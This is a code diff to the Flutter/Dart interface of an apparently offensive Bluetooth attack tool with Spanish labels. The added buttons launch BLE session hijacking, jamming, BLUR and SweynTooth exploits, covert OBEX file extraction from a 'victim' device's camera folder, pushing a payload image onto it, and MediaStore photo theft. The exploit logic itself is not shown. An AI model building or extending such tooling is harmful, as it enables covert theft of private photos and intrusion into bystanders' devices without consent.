+                 checked: _deepAnalysis,
+                 child: const Text('🔬 Análisis profundo'),
+               ),
+               const PopupMenuDivider(),
               const PopupMenuItem(
                 value: 'report',
                 child: Row(
@@ -2745,16 +3239,21 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     ]);
   }
 
-  Widget _buildBtleJackTab() {
-    return ListView(padding: const EdgeInsets.all(16), children: [
-      _buildSectionTitle('BTLEJACK CORE', 'Exploits avanzados de BLE'),
-      const SizedBox(height: 20),
-      _buildAttackCard('SCAN', 'Enumeración', Colors.blue, () => _attack('btlejack', command: 'scan'), type: 'btlejack'),
-      _buildAttackCard('SNIFF', 'Captura de paquetes', Colors.purple, () => _attack('btlejack', command: 'sniff'), type: 'btlejack'),
-      _buildAttackCard('HIJACK', 'Takeover de sesión', Colors.red, () => _attack('btlejack', command: 'hijack'), type: 'btlejack'),
-      _buildAttackCard('JAM', 'Interrupción RF', Colors.deepOrange, () => _attack('btlejack', command: 'jam'), type: 'btlejack'),
-    ]);
-  }
+   Widget _buildBtleJackTab() {
+     return ListView(padding: const EdgeInsets.all(16), children: [
+       _buildSectionTitle('BTLEJACK CORE', 'Exploits avanzados de BLE'),
+       const SizedBox(height: 20),
+       _buildAttackCard('SCAN', 'Enumeración', Colors.blue, () => _attack('btlejack', command: 'scan'), type: 'btlejack'),
+       _buildAttackCard('SNIFF', 'Captura de paquetes', Colors.purple, () => _attack('btlejack', command: 'sniff'), type: 'btlejack'),
+       _buildAttackCard('HIJACK', 'Takeover de sesión', Colors.red, () => _attack('btlejack', command: 'hijack'), type: 'btlejack'),
+       _buildAttackCard('JAM', 'Interrupción RF', Colors.deepOrange, () => _attack('btlejack', command: 'jam'), type: 'btlejack'),
+       const SizedBox(height: 8),
+       _buildSectionTitle('BLE 5.x MODERN EXPLOITS', 'Vulnerabilidades recientes (BLUR, SweynTooth)'),
+       const SizedBox(height: 12),
+       _buildAttackCard('🔶 BLUR ATTACK', 'CVE-2022-20361 - BLE connection hijack', Colors.redAccent, () => _attack('blur_attack'), type: 'blur_attack'),
+       _buildAttackCard('🔷 SWEYNTOOTH', 'CVE-2019-17053 - LLID/L2CAP injection', Colors.deepPurple, () => _attack('sweyntooth_attack'), type: 'sweyntooth_attack'),
+     ]);
+   }
 
   Widget _buildDosTab() {
     return ListView(padding: const EdgeInsets.all(16), children: [
@@ -2865,8 +3364,29 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
         ),
       ],
       const SizedBox(height: 16),
-      // AUTHENTICATION BYPASS TECHNIQUES (OffensiveCon 2025)
-      _buildSectionTitle('AUTH BYPASS', 'OffensiveCon 2025 - Bluetooth Auth Bypass'),
+       // OBEX OVER BLE (Modern)
+       _buildSectionTitle('OBEX OVER BLE', 'Transferencia sigilosa via BLE GATT'),
+       const SizedBox(height: 12),
+       if (_selectedDevice == null)
+         _buildExploitCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Icons.bluetooth, Colors.grey, null)
+        else
+          _buildExploitCard('📁 OBEX BLE TRANSFER', 'Extraer archivos via OBEX sobre BLE', Icons.bluetooth, Colors.cyan, () => _attack('obex_ble_transfer', command: '/DCIM/Camera')),
+        // OPP PUSH - Envío forzado de archivos al víctima
+        if (_selectedDevice != null)
+          _buildExploitCard('📤 OPP PUSH', 'Inyectar archivo al dispositivo víctima', Icons.upload, Colors.teal, () => _attack('opp_push', command: '/sdcard/DCIM/Camera/bluesnafer_payload.jpg')),
+        const SizedBox(height: 16),
+        // MEDIASTORE HIJACK (Android 11+)
+       _buildSectionTitle('MEDIASTORE HIJACK', 'Extraer fotos via MediaStore (permisos locales)'),
+       const SizedBox(height: 12),
+       if (_selectedDevice == null)
+         _buildExploitCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Icons.photo_library, Colors.grey, null)
+       else
+         _buildExploitCard('🖼️ ENUMERAR IMÁGENES', 'Listar todas las fotos del almacenamiento', Icons.photo_library, Colors.green, () => _attack('mediastore_enumerate')),
+       if (_selectedDevice != null)
+         _buildExploitCard('💾 EXTRAER ÚLTIMA IMAGEN', 'Extraer última imagen (requiere URI)', Icons.download, Colors.amber, () => _attack('mediastore_extract', command: '')),
+       const SizedBox(height: 16),
+       // AUTHENTICATION BYPASS TECHNIQUES (OffensiveCon 2025)
+       _buildSectionTitle('AUTH BYPASS', 'OffensiveCon 2025 - Bluetooth Auth Bypass'),
       const SizedBox(height: 12),
       if (_selectedDevice == null)
         _buildExploitCard('SELECCIONA DISPOSITIVO', 'Ve a RADAR primero', Icons.lock_open, Colors.grey, null)
